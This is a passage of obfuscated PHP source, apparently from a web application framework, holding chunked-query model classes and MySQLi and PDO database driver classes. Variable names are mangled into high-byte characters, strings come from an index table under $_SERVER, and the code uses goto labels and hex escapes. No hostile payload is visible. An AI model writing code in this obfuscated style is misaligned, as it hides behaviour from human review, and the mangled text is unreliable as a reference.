çÊÜ¸); if (!is_array($Â…»‡‚) || count($Â…»‡‚) == 0) { break; } $áôèùáÒ[$£òä¸ïŸ[275]][$„«ª‡í][1] = $Â…»‡‚; $this->optionsValue($áôèùáÒ); $ëÛÜÅä = parent::select($Éıø‹©Ï); if (!$ëÛÜÅä) { continue; } $éÖ™³äŸ = is_array($éÖ™³äŸ) ? $éÖ™³äŸ : array(); $éÖ™³äŸ = array_merge($éÖ™³äŸ, $ëÛÜÅä); } return $éÖ™³äŸ; } public function delete($˜’ô¢´Ó = array()) { $ËäÚàş³ =& $_SERVER[ßğøİ]; $ƒÊ¥Ì = self::SQL_WHERE_IN_CHUNK; $€•ß˜üÊ = $this->optionsValue(); $Ô­‡Á­Ù = $this->findWhereField($€•ß˜üÊ); if (!$Ô­‡Á­Ù) { return parent::delete($˜’ô¢´Ó); } $ÁµõÎ¡ = 0; $Î×‘”ÓÂ = $€•ß˜üÊ[$ËäÚàş³[275]][$Ô­‡Á­Ù][1]; $Î×‘”ÓÂ = is_array($Î×‘”ÓÂ) ? $Î×‘”ÓÂ : array(); for ($õ‰èŒ«Ê = 0; $õ‰èŒ«Ê < count($Î×‘”ÓÂ); $õ‰èŒ«Ê += $ƒÊ¥Ì) { $“Ä€ÈêÁ = array_slice($Î×‘”ÓÂ, $õ‰èŒ«Ê, $ƒÊ¥Ì); if (!is_array($“Ä€ÈêÁ) || count($“Ä€ÈêÁ) == 0) { break; } $€•ß˜üÊ[$ËäÚàş³[275]][$Ô­‡Á­Ù][1] = $“Ä€ÈêÁ; $this->optionsValue($€•ß˜üÊ); $ÁµõÎ¡ += parent::delete($˜’ô¢´Ó); } return $ÁµõÎ¡; } private function findWhereField($ë£û¸Æ) { $×ı¸­Ô© =& $_SERVER[ßğøİ]; $°âËçöú = self::SQL_WHERE_IN_CHUNK; if (!is_array($ë£û¸Æ) || !is_array($ë£û¸Æ[$×ı¸­Ô©[275]])) { return !1; } foreach ($ë£û¸Æ[$×ı¸­Ô©[275]] as $äò¼€†â => $ˆÄ–Ÿ¹) { if (is_array($ˆÄ–Ÿ¹) && isset($ˆÄ–Ÿ¹[0]) && is_string($ˆÄ–Ÿ¹[0]) && strtolower($ˆÄ–Ÿ¹[0]) == $×ı¸­Ô©[7] && is_array($ˆÄ–Ÿ¹[1]) && count($ˆÄ–Ÿ¹[1]) > $°âËçöú) { ignore_timeout(); return $äò¼€†â; } } return !1; } public function setMasterDB($¥º¡Ñ´¼ = true) { think_config($_SERVER[ßğøİ][395], $¥º¡Ñ´¼); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\x79\x73\x74\x65\x6d\117\160\x74\x69\157\156"; public $field = array(); public function listData($º¬©éªš = false, $ÈÛ÷ËàÎ = "\x6d\157\144\x69\x66\171\x54\x69\x6d\x65", $ÆÕ±Ö³ = false) { $¾áğ¦¸â = Model($this->modelType)->get(!1, $this->optionType, !0); $–µ¯áÏŒ = array_values($¾áğ¦¸â); if ($–µ¯áÏŒ && $–µ¯áÏŒ[0] && !is_array($–µ¯áÏŒ[0])) { Model($this->modelType)->cacheRemove($this->optionType); $¾áğ¦¸â = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$¾áğ¦¸â) { return $º¬©éªš ? null : array(); } if (!$º¬©éªš) { $¾áğ¦¸â = array_filter(array_values($¾áğ¦¸â)); return array_sort_by($¾áğ¦¸â, $ÈÛ÷ËàÎ, $ÆÕ±Ö³); } return $¾áğ¦¸â[$_SERVER[ßğøİ][396] . $º¬©éªš]; } public function insert($€îÄ§±¬) { $ëØ˜û¾½ =& $_SERVER[ßğøİ]; $€îÄ§±¬ = array_field_key($€îÄ§±¬, $this->field); $àøåœŒ = Model($this->modelType)->get($ëØ˜û¾½[397], $this->optionType . $ëØ˜û¾½[398]); $àøåœŒ = $àøåœŒ ? $àøåœŒ : 0; $€îÄ§±¬[$ëØ˜û¾½[399]] = ++$àøåœŒ; $€îÄ§±¬[$ëØ˜û¾½[200]] = time(); $€îÄ§±¬[$ëØ˜û¾½[85]] = time(); Model($this->modelType)->set($ëØ˜û¾½[397], $àøåœŒ, $this->optionType . $ëØ˜û¾½[398]); Model($this->modelType)->set($ëØ˜û¾½[396] . $àøåœŒ, $€îÄ§±¬, $this->optionType); return $àøåœŒ; } public function update($„³í±şé, $ëØÔè¹Á) { $°Çİáè =& $_SERVER[ßğøİ]; $ëØÔè¹Á = array_field_key($ëØÔè¹Á, $this->field); $æÜˆ÷ñ = $this->listData($„³í±şé); if (!$æÜˆ÷ñ || !$„³í±şé) { return !1; } $ëØÔè¹Á = array_merge($æÜˆ÷ñ, $ëØÔè¹Á); $ëØÔè¹Á[$°Çİáè[85]] = time(); return Model($this->modelType)->set($°Çİáè[396] . $„³í±şé, $ëØÔè¹Á, $this->optionType); } public function remove($‘üìÃç¦) { if (!$‘üìÃç¦) { return !1; } return Model($this->modelType)->remove($_SERVER[ßğøİ][396] . $‘üìÃç¦, $this->optionType); } public function clear() { $ÓŒÕÀ¨ =& $_SERVER[ßğøİ]; Model($this->modelType)->remove($ÓŒÕÀ¨[397], $this->optionType . $ÓŒÕÀ¨[398]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($ºé±ÊÒ, $“û¿¸‰¸) { if (!$“û¿¸‰¸) { return !1; } $øİ¨ıéÄ = $this->listData(); $øİ¨ıéÄ = array_to_keyvalue($øİ¨ıéÄ, $ºé±ÊÒ); return isset($øİ¨ıéÄ[$“û¿¸‰¸]) ? $øİ¨ıéÄ[$“û¿¸‰¸] : !1; } public function findByName($’öäê§ƒ) { return $this->findByKey($_SERVER[ßğøİ][32], $’öäê§ƒ); } protected function resetData($ÍÓì»Œ±) { $Š‰ğÁô =& $_SERVER[ßğøİ]; $ÍÓì»Œ± = is_array($ÍÓì»Œ±) ? $ÍÓì»Œ± : array(); $¿ì›º½Æ = array(); for ($¶„œ¿«á = 0; $¶„œ¿«á < count($ÍÓì»Œ±); $¶„œ¿«á++) { $¿ì›º½Æ[$Š‰ğÁô[396] . $ÍÓì»Œ±[$¶„œ¿«á][$Š‰ğÁô[399]]] = $ÍÓì»Œ±[$¶„œ¿«á]; } return Model($this->modelType)->set($¿ì›º½Æ, !1, $this->optionType); } private function getAutoName($ŒñÓ½ëå) { $ğŸÑ’é = array_to_keyvalue($this->listData(), $_SERVER[ßğøİ][32]); if (!$ğŸÑ’é || !isset($ğŸÑ’é[$ŒñÓ½ëå])) { return $ŒñÓ½ëå; } for ($Œ±êÒ© = 1; $Œ±êÒ© < count($ğŸÑ’é); $Œ±êÒ©++) { $Ô°»Ô° = $ŒñÓ½ëå . "\50{$Œ±êÒ©}\x29"; if (!isset($ğŸÑ’é[$Ô°»Ô°])) { return $Ô°»Ô°; } } return $Ô°»Ô°; } } goto E¨ŠßğøÈÛ; Aµ¹›ŸäùË: class DbMysqli extends Db { public function __construct($ŞÛáÊà = '') { $­µÉù” =& $_SERVER[ßğøİ]; if (!extension_loaded($­µÉù”[912])) { think_exception(think_lang($­µÉù”[14]) . $­µÉù”[913]); } if (!empty($ŞÛáÊà)) { $this->config = $ŞÛáÊà; if (empty($this->config[$­µÉù”[17]])) { $this->config[$­µÉù”[17]] = $­µÉù”[12]; } } } public function connect($¯¡ûö‡ = '', $Û ¶İ = 0) { $¹øø½˜ =& $_SERVER[ßğøİ]; if (!isset($this->linkID[$Û ¶İ])) { if (empty($¯¡ûö‡)) { $¯¡ûö‡ = $this->config; } $this->linkID[$Û ¶İ] = new mysqli($¯¡ûö‡[$¹øø½˜[885]], $¯¡ûö‡[$¹øø½˜[887]], $¯¡ûö‡[$¹øø½˜[888]], $¯¡ûö‡[$¹øø½˜[21]], $¯¡ûö‡[$¹øø½˜[886]] ? intval($¯¡ûö‡[$¹øø½˜[886]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $ÔîØñïÇ = $this->linkID[$Û ¶İ]->server_version; $this->linkID[$Û ¶İ]->query($¹øø½˜[889] . think_config($¹øø½˜[890]) . $¹øø½˜[58]); if ($ÔîØñïÇ > $¹øø½˜[891]) { $this->linkID[$Û ¶İ]->query($¹øø½˜[892]); } $this->connected = !0; if (1 != think_config($¹øø½˜[22])) { unset($this->config); } } return $this->linkID[$Û ¶İ]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($¡€‡È½Æ) { $¢ÏòÏª† =& $_SERVER[ßğøİ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $¡€‡È½Æ; if ($this->queryID) { $this->free(); } think_action_status($¢ÏòÏª†[23], 1); think_status($¢ÏòÏª†[24]); $this->queryID = $this->_linkID->query($¡€‡È½Æ); if ($this->_linkID->more_results()) { while (($”í«£ƒ‡ = $this->_linkID->next_result()) != NULL) { $”í«£ƒ‡->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($©Âßøƒ‰) { $½©Âêªˆ =& $_SERVER[ßğøİ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $©Âßøƒ‰; if ($this->queryID) { $this->free(); } think_action_status($½©Âêªˆ[25], 1); think_status($½©Âêªˆ[24]); $Éğ»£—å = $this->_linkID->query($©Âßøƒ‰); $this->debug(); if (!1 === $Éğ»£—å) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ÓíÎîŸ± = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$ÓíÎîŸ±) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÊõÍŞş = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ÊõÍŞş) { $this->error(); return !1; } } return !0; } private function getAll() { $°²Ó‘‰Ã = array(); if ($this->numRows > 0) { for ($´„µûø® = 0; $´„µûø® < $this->numRows; $´„µûø®++) { $°²Ó‘‰Ã[$´„µûø®] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $°²Ó‘‰Ã; } public function getFields($‡µäÀ” ) { $·ıùÈ†Ø =& $_SERVER[ßğøİ]; $¬ŸÂ¤™¨ = $this->query($·ıùÈ†Ø[896] . $this->parseKey($‡µäÀ” )); $õµ„ª“® = array(); if ($¬ŸÂ¤™¨) { foreach ($¬ŸÂ¤™¨ as $¨¹ç ñ => $×Ô¸ª¡Š) { $õµ„ª“®[$×Ô¸ª¡Š[$·ıùÈ†Ø[31]]] = array($·ıùÈ†Ø[32] => $×Ô¸ª¡Š[$·ıùÈ†Ø[31]], $·ıùÈ†Ø[33] => $×Ô¸ª¡Š[$·ıùÈ†Ø[34]], $·ıùÈ†Ø[35] => (bool) ($×Ô¸ª¡Š[$·ıùÈ†Ø[36]] === $·ıùÈ†Ø[12]), $·ıùÈ†Ø[37] => $×Ô¸ª¡Š[$·ıùÈ†Ø[38]], $·ıùÈ†Ø[39] => strtolower($×Ô¸ª¡Š[$·ıùÈ†Ø[40]]) == $·ıùÈ†Ø[41], $·ıùÈ†Ø[42] => strtolower($×Ô¸ª¡Š[$·ıùÈ†Ø[43]]) == $·ıùÈ†Ø[44]); } } return $õµ„ª“®; } public function getTables($ºÕœê× = '') { $Ù•Ø¢ÛÍ =& $_SERVER[ßğøİ]; $Æ‚şÃ«“ = !empty($ºÕœê×) ? $Ù•Ø¢ÛÍ[898] . $ºÕœê× . $Ù•Ø¢ÛÍ[899] : $Ù•Ø¢ÛÍ[900]; $‡ø‡º÷¾ = $this->query($Æ‚şÃ«“); $Æ‰Ÿµª» = array(); if ($‡ø‡º÷¾) { foreach ($‡ø‡º÷¾ as $®™ä˜½ç => $ó¨èí²­) { $Æ‰Ÿµª»[$®™ä˜½ç] = current($ó¨èí²­); } } return $Æ‰Ÿµª»; } public function replace($ÒòÉÓ€º, $€ôıÊÑ = array()) { $€•¨ëÂÍ =& $_SERVER[ßğøİ]; foreach ($ÒòÉÓ€º as $ëúĞìŸ­ => $†”¨¦í) { $‰¨ŸéÁ» = $this->parseValue($†”¨¦í); if (is_scalar($‰¨ŸéÁ»)) { $±¦›‚Šè[] = $‰¨ŸéÁ»; $œ¦ì¾ì[] = $this->parseKey($ëúĞìŸ­); } } $úÄ¢¯ó” = $€•¨ëÂÍ[901] . $this->parseTable($€ôıÊÑ[$€•¨ëÂÍ[279]]) . $€•¨ëÂÍ[902] . implode($€•¨ëÂÍ[50], $œ¦ì¾ì) . $€•¨ëÂÍ[903] . implode($€•¨ëÂÍ[50], $±¦›‚Šè) . $€•¨ëÂÍ[904]; return $this->execute($úÄ¢¯ó”); } public function insertAll($æñÆª‰À, $ïáıÎƒÕ = array(), $¿äÇ½» = false) { $ŒÓ¤”¶ =& $_SERVER[ßğøİ]; if (!is_array($æñÆª‰À[0])) { return !1; } $·§­½–· = array_keys($æñÆª‰À[0]); $ÆáîİÈ = array(); foreach ($æñÆª‰À as $ì×¢ÈŠ¯) { $“´³®ô = array(); foreach ($ì×¢ÈŠ¯ as $µêö»¶« => $Í¥œá¶) { $Í¥œá¶ = $this->parseValue($Í¥œá¶); if (is_scalar($Í¥œá¶)) { $“´³®ô[] = $Í¥œá¶; } } $ÆáîİÈ[] = $ŒÓ¤”¶[260] . implode($ŒÓ¤”¶[50], $“´³®ô) . $ŒÓ¤”¶[904]; } array_walk($·§­½–·, array($this, $ŒÓ¤”¶[905])); $Ï·İ”İÚ = $¿äÇ½» ? $ŒÓ¤”¶[906] : $ŒÓ¤”¶[907]; $²€éäÂ¼ = $Ï·İ”İÚ . $ŒÓ¤”¶[908] . $this->parseTable($ïáıÎƒÕ[$ŒÓ¤”¶[279]]) . $ŒÓ¤”¶[902] . implode($ŒÓ¤”¶[50], $·§­½–·) . $ŒÓ¤”¶[909] . implode($ŒÓ¤”¶[50], $ÆáîİÈ); return $this->execute($²€éäÂ¼); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $¨†Ö‡¶½ =& $_SERVER[ßğøİ]; $this->error = $this->_linkID->errno . $¨†Ö‡¶½[4] . $this->_linkID->error; if ($¨†Ö‡¶½[12] != $this->queryStr) { $this->error .= LNG($¨†Ö‡¶½[48]) . $this->queryStr; } think_trace($this->error, $¨†Ö‡¶½[12], $¨†Ö‡¶½[49]); return $this->error; } public function escapeString($ĞŒ©®÷ğ) { if ($this->_linkID) { return $this->_linkID->real_escape_string($ĞŒ©®÷ğ); } else { return addslashes($ĞŒ©®÷ğ); } } public function parseKey(&$ê‰¤İ, $™Ê¿–œ = true) { $ÊĞµ®§ =& $_SERVER[ßğøİ]; if ($™Ê¿–œ) { $ê‰¤İ = $this->parseKeyCheck($ê‰¤İ); } if ($ê‰¤İ != $ÊĞµ®§[188] && !preg_match($ÊĞµ®§[910], $ê‰¤İ)) { $ê‰¤İ = $ÊĞµ®§[385] . trim($ê‰¤İ, $ÊĞµ®§[385]) . $ÊĞµ®§[385]; } return $ê‰¤İ; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($òÍ¹Ú˜ = '') { $×²—Ä =& $_SERVER[ßğøİ]; if (!class_exists($×²—Ä[914])) { think_exception(think_lang($×²—Ä[14]) . $×²—Ä[915]); } if (!empty($òÍ¹Ú˜)) { $this->config = $òÍ¹Ú˜; if (empty($this->config[$×²—Ä[17]])) { $this->config[$×²—Ä[17]] = array(); } } } public function connect($ÃÃ¡ìí = '', $´Ã©‡‘ï = 0) { $ ıô‰ŠÅ =& $_SERVER[ßğøİ]; if (!isset($this->linkID[$´Ã©‡‘ï])) { if (empty($ÃÃ¡ìí)) { $ÃÃ¡ìí = $this->config; } $ã£ØåŸ = !empty($ÃÃ¡ìí[$ ıô‰ŠÅ[17]][$ ıô‰ŠÅ[18]]) ? $ÃÃ¡ìí[$ ıô‰ŠÅ[17]][$ ıô‰ŠÅ[18]] : $this->pconnect; if ($ã£ØåŸ) { $ÃÃ¡ìí[$ ıô‰ŠÅ[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$´Ã©‡‘ï] = new PDO($ÃÃ¡ìí[$ ıô‰ŠÅ[916]], $ÃÃ¡ìí[$ ıô‰ŠÅ[887]], $ÃÃ¡ìí[$ ıô‰ŠÅ[888]], $ÃÃ¡ìí[$ ıô‰ŠÅ[17]]); } catch (PDOException $ÉÍ€ä) { think_exception($ÉÍ€ä->getMessage()); } $this->dbType = $this->_getDsnType($ÃÃ¡ìí[$ ıô‰ŠÅ[916]]); if (in_array($this->dbType, array($ ıô‰ŠÅ[917], $ ıô‰ŠÅ[918], $ ıô‰ŠÅ[919], $ ıô‰ŠÅ[920]))) { think_exception($ ıô‰ŠÅ[921] . $this->dbType . $ ıô‰ŠÅ[922] . $this->dbType . $ ıô‰ŠÅ[923]); } if (!$this->linkID[$´Ã©‡‘ï]) { think_exception($ ıô‰ŠÅ[924]); } try { $this->linkID[$´Ã©‡‘ï]->exec($ ıô‰ŠÅ[925] . think_config($ ıô‰ŠÅ[890])); } catch (Exception $ÉÍ€ä) { } $this->connected = !0; if (1 != think_config($ ıô‰ŠÅ[22])) { unset($this->config); } } return $this->linkID[$´Ã©‡‘ï]; } public function free() { $this->PDOStatement = null; } public function query($™µÛö¾¥, $¯¯Ü…Î§ = array()) { $Ğİ³ÚúÆ =& $_SERVER[ßğøİ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $™µÛö¾¥; if (!empty($¯¯Ü…Î§)) { $this->queryStr .= $Ğİ³ÚúÆ[926] . print_r($¯¯Ü…Î§, !0) . $Ğİ³ÚúÆ[927]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($Ğİ³ÚúÆ[23], 1); think_status($Ğİ³ÚúÆ[24]); $this->PDOStatement = $this->_linkID->prepare($™µÛö¾¥); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ì‘Ú ò  = $this->PDOStatement->execute($¯¯Ü…Î§); $this->debug(); if (!1 === $ì‘Ú ò ) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($Ò«‰¨¸, $ñØ„îûş = array()) { $Ä¢€ÉËü =& $_SERVER[ßğøİ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Ò«‰¨¸; if (!empty($ñØ„îûş)) { $this->queryStr .= $Ä¢€ÉËü[926] . print_r($ñØ„îûş, !0) . $Ä¢€ÉËü[927]; } $á¸ÊşÎŠ = !1; if ($this->dbType == $Ä¢€ÉËü[920]) { if (preg_match($Ä¢€ÉËü[928], $this->queryStr, $½¦¸¢±Ü)) { $this->table = think_config($Ä¢€ÉËü[929]) . str_ireplace(think_config($Ä¢€ÉËü[930]), $Ä¢€ÉËü[378], $½¦¸¢±Ü[2]); $á¸ÊşÎŠ = (bool) $this->query($Ä¢€ÉËü[931] . strtoupper($this->table) . $Ä¢€ÉËü[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($Ä¢€ÉËü[25], 1); think_status($Ä¢€ÉËü[24]); $this->PDOStatement = $this->_linkID->prepare($Ò«‰¨¸); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $éè››Øâ = $this->PDOStatement->execute($ñØ„îûş); $this->debug(); if (!1 === $éè››Øâ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($á¸ÊşÎŠ || preg_match($Ä¢€ÉËü[932], $Ò«‰¨¸)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ŞŞ©ßşŒ = $this->_linkID->commit(); $this->transTimes = 0; if (!$ŞŞ©ßşŒ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ûÀ“óÌ´ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ûÀ“óÌ´) { $this->error(); return !1; } } return !0; } private function getAll() { $Ãš–Ê² = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($Ãš–Ê²); return $Ãš–Ê²; } public function getFields($¸—”±) { $³ÑŞÕ÷¸ =& $_SERVER[ßğøİ]; $this->initConnect(!0); if (think_config($³ÑŞÕ÷¸[933])) { $¤É ê—œ = str_replace($³ÑŞÕ÷¸[934], $¸—”±, think_config($³ÑŞÕ÷¸[933])); } else { switch ($this->dbType) { case $³ÑŞÕ÷¸[917]: case $³ÑŞÕ÷¸[935]: $¤É ê—œ = "\x53\x45\114\105\103\x54\40\x20\x20\143\x6f\154\x75\155\156\137\x6e\x61\x6d\145\40\x61\x73\40\47\x4e\x61\155\145\x27\x2c\x20\40\x20\144\141\x74\141\x5f\164\171\x70\145\40\141\163\40\47\124\x79\160\x65\x27\x2c\x20\x20\40\143\x6f\x6c\x75\x6d\156\137\144\145\146\x61\x75\154\x74\x20\x61\x73\x20\x27\x44\145\146\141\x75\154\164\x27\x2c\x20\x20\x20\151\x73\x5f\156\165\x6c\x6c\141\142\x6c\x65\x20\141\x73\40\x27\x4e\x75\154\154\x27\xa\x9\x9\x46\122\117\x4d\11\x69\x6e\x66\x6f\x72\x6d\141\164\x69\x6f\156\x5f\x73\143\150\x65\x6d\141\56\x74\x61\x62\154\145\163\40\x41\123\40\164\12\11\x9\112\117\111\116\11\151\156\x66\157\x72\155\x61\x74\x69\x6f\156\137\163\143\150\145\155\x61\x2e\x63\x6f\154\x75\155\156\163\40\101\x53\40\143\12\11\11\117\x4e\40\40\x74\x2e\164\x61\142\154\x65\x5f\143\141\164\141\x6c\x6f\x67\40\75\x20\143\56\164\141\x62\154\x65\137\x63\x61\164\x61\x6c\x6f\147\xa\x9\11\101\x4e\x44\40\x74\x2e\x74\141\x62\154\x65\137\163\143\150\x65\x6d\141\40\x3d\40\143\56\164\x61\142\x6c\x65\137\x73\143\x68\145\x6d\x61\12\11\x9\x41\116\104\x20\x74\x2e\x74\141\142\154\145\137\x6e\x61\155\x65\x20\x3d\x20\143\56\164\141\x62\x6c\145\137\x6e\141\x6d\x65\12\x9\x9\x57\110\105\x52\x45\40\40\x20\164\56\x74\x61\x62\x6c\145\x5f\x6e\x61\x6d\x65\x20\x3d\x20\x27{$¸—”±}\x27"; break; case $³ÑŞÕ÷¸[936]: $¤É ê—œ = $³ÑŞÕ÷¸[937] . $¸—”± . $³ÑŞÕ÷¸[938]; break; case $³ÑŞÕ÷¸[918]: case $³ÑŞÕ÷¸[920]: $¤É ê—œ = $³ÑŞÕ÷¸[939] . $³ÑŞÕ÷¸[940] . $³ÑŞÕ÷¸[941] . strtoupper($¸—”±) . $³ÑŞÕ÷¸[942] . strtoupper($¸—”±) . $³ÑŞÕ÷¸[943]; break; case $³ÑŞÕ÷¸[944]: $¤É ê—œ = $³ÑŞÕ÷¸[945] . $¸—”± . $³ÑŞÕ÷¸[946]; break; case $³ÑŞÕ÷¸[919]: break; case $³ÑŞÕ÷¸[947]: default: $¤É ê—œ = $³ÑŞÕ÷¸[948] . ($this->dbType == $³ÑŞÕ÷¸[947] ? "\140{$¸—”±}\140" : $¸—”±); } } $ŸŠøŸ› = $this->query($¤É ê—œ); $‡Âç§Á = array(); if ($ŸŠøŸ›) { foreach ($ŸŠøŸ› as $•ÂÎ¸‰¿ => $™À¯Ãúö) { $™À¯Ãúö = array_change_key_case($™À¯Ãúö); $™À¯Ãúö[$³ÑŞÕ÷¸[32]] = isset($™À¯Ãúö[$³ÑŞÕ÷¸[32]]) ? $™À¯Ãúö[$³ÑŞÕ÷¸[32]] : $³ÑŞÕ÷¸[378]; $™À¯Ãúö[$³ÑŞÕ÷¸[33]] = isset($™À¯Ãúö[$³ÑŞÕ÷¸[33]]) ? $™À¯Ãúö[$³ÑŞÕ÷¸[33]] : $³ÑŞÕ÷¸[378]; $ñ²›¶äÊ = isset($™À¯Ãúö[$³ÑŞÕ÷¸[273]]) ? $™À¯Ãúö[$³ÑŞÕ÷¸[273]] : $™À¯Ãúö[$³ÑŞÕ÷¸[32]]; $‡Âç§Á[$ñ²›¶äÊ] = array($³ÑŞÕ÷¸[32] => $ñ²›¶äÊ, $³ÑŞÕ÷¸[33] => $™À¯Ãúö[$³ÑŞÕ÷¸[33]], $³ÑŞÕ÷¸[35] => (bool) (isset($™À¯Ãúö[$³ÑŞÕ÷¸[103]]) && $™À¯Ãúö[$³ÑŞÕ÷¸[103]] === $³ÑŞÕ÷¸[12] || isset($™À¯Ãúö[$³ÑŞÕ÷¸[35]]) && $™À¯Ãúö[$³ÑŞÕ÷¸[35]] === $³ÑŞÕ÷¸[12]), $³ÑŞÕ÷¸[37] => isset($™À¯Ãúö[$³ÑŞÕ÷¸[37]]) ? $™À¯Ãúö[$³ÑŞÕ÷¸[37]] : (isset($™À¯Ãúö[$³ÑŞÕ÷¸[56]]) ? $™À¯Ãúö[$³ÑŞÕ÷¸[56]] : $³ÑŞÕ÷¸[378]), $³ÑŞÕ÷¸[39] => isset($™À¯Ãúö[$³ÑŞÕ÷¸[94]]) ? strtolower($™À¯Ãúö[$³ÑŞÕ÷¸[94]]) == $³ÑŞÕ÷¸[41] : (isset($™À¯Ãúö[$³ÑŞÕ÷¸[57]]) ? $™À¯Ãúö[$³ÑŞÕ÷¸[57]] : !1), $³ÑŞÕ÷¸[42] => isset($™À¯Ãúö[$³ÑŞÕ÷¸[949]]) ? strtolower($™À¯Ãúö[$³ÑŞÕ÷¸[949]]) == $³ÑŞÕ÷¸[44] : (isset($™À¯Ãúö[$³ÑŞÕ÷¸[94]]) ? $™À¯Ãúö[$³ÑŞÕ÷¸[94]] : !1)); } } return $‡Âç§Á; } public function getTables($¸õ´ÙÍÂ = '') { $¢äãë×ı =& $_SERVER[ßğøİ]; if (think_config($¢äãë×ı[950])) { $ÌÒŒó² = str_replace($¢äãë×ı[951], $¸õ´ÙÍÂ, think_config($¢äãë×ı[950])); } else { switch ($this->dbType) { case $¢äãë×ı[918]: case $¢äãë×ı[920]: $ÌÒŒó² = $¢äãë×ı[952]; break; case $¢äãë×ı[917]: case $¢äãë×ı[935]: $ÌÒŒó² = $¢äãë×ı[953]; break; case $¢äãë×ı[944]: $ÌÒŒó² = $¢äãë×ı[954]; break; case $¢äãë×ı[919]: think_exception(think_lang($¢äãë×ı[955]) . $¢äãë×ı[956]); break; case $¢äãë×ı[936]: $ÌÒŒó² = $¢äãë×ı[45] . $¢äãë×ı[46] . $¢äãë×ı[47]; break; case $¢äãë×ı[947]: default: if (!empty($¸õ´ÙÍÂ)) { $ÌÒŒó² = $¢äãë×ı[898] . $¸õ´ÙÍÂ . $¢äãë×ı[899]; } else { $ÌÒŒó² = $¢äãë×ı[900]; } } } $©ÑäÌòÀ = $this->query($ÌÒŒó²); $ú«Ÿ¼ò = array(); foreach ($©ÑäÌòÀ as $à—Îıó™ => $ “ÌÃ¨¨) { $ú«Ÿ¼ò[$à—Îıó™] = current($ “ÌÃ¨¨); } return $ú«Ÿ¼ò; } protected function parseLimit($•ÜœˆôË) { $Œúê°†˜ =& $_SERVER[ßğøİ]; $ÌÔ§èİ™ = $Œúê°†˜[12]; if (!empty($•ÜœˆôË)) { switch ($this->dbType) { case $Œúê°†˜[944]: case $Œúê°†˜[936]: $•ÜœˆôË = explode($Œúê°†˜[50], $•ÜœˆôË); if (count($•ÜœˆôË) > 1) { $ÌÔ§èİ™ .= $Œúê°†˜[51] . $•ÜœˆôË[1] . $Œúê°†˜[52] . $•ÜœˆôË[0] . $Œúê°†˜[53]; } else { $ÌÔ§èİ™ .= $Œúê°†˜[51] . $•ÜœˆôË[0] . $Œúê°†˜[53]; } break; case $Œúê°†˜[917]: case $Œúê°†˜[935]: break; case $Œúê°†˜[919]: break; case $Œúê°†˜[918]: case $Œúê°†˜[920]: break; case $Œúê°†˜[947]: default: $ÌÔ§èİ™ .= $Œúê°†˜[51] . $•ÜœˆôË . $Œúê°†˜[53]; } } return $ÌÔ§èİ™; } public function parseKey(&$¬¸×Ÿşµ, $Û‚¨Œ—ß = true) { $ã¡ïü–û =& $_SERVER[ßğøİ]; if ($Û‚¨Œ—ß) { $¬¸×Ÿşµ = $this->parseKeyCheck($¬¸×Ÿşµ); } if ($this->dbType == $ã¡ïü–û[947]) { if ($¬¸×Ÿşµ != $ã¡ïü–û[188] && !preg_match($ã¡ïü–û[910], $¬¸×Ÿşµ)) { $¬¸×Ÿşµ = $ã¡ïü–û[385] . trim($¬¸×Ÿşµ, $ã¡ïü–û[385]) . $ã¡ïü–û[385]; } return $¬¸×Ÿşµ; } else { return parent::parseKey($¬¸×Ÿşµ, $Û‚¨Œ—ß); } } public function close() { $this->_linkID = null; } public function error() { $›Óï“‹¡ =& $_SERVER[ßğøİ]; if ($this->PDOStatement) { $—Ê¿˜Ú = $this->PDOStatement->errorInfo(); $this->error = $—Ê¿˜Ú[1] . $›Óï“‹¡[4] . $—Ê¿˜Ú[2]; } else { $this->error = $›Óï“‹¡[12]; } if ($›Óï“‹¡[12] != $this->queryStr) { $this->error .= LNG($›Óï“‹¡[48]) . $this->queryStr; } think_trace($this->error, $›Óï“‹¡[12], $›Óï“‹¡[49]); return $this->error; } public function escapeString($ßäÖŠ›ï) { $É­ıú©Ø =& $_SERVER[ßğøİ]; switch ($this->dbType) { case $É­ıú©Ø[944]: case $É­ıú©Ø[917]: case $É­ıú©Ø[935]: case $É­ıú©Ø[947]: return addslashes($ßäÖŠ›ï); 